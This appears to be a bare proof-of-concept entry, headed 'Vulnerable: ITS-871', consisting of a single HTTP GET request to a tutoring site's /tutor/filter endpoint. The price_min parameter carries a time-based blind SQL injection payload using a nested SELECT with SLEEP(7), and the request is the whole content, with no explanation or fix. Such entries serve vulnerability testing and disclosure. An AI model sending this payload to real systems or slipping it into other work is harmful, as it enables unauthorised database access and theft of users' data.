# Vulnerable: ITS-871
GET /tutor/filter?searched_word=&searched_tution_class_type[]=1&price_min=(SELECT(0)FROM(SELECT(SLEEP(7)))a)&price_max=9&searched_price_type[]=hourly&searched_duration[]=0
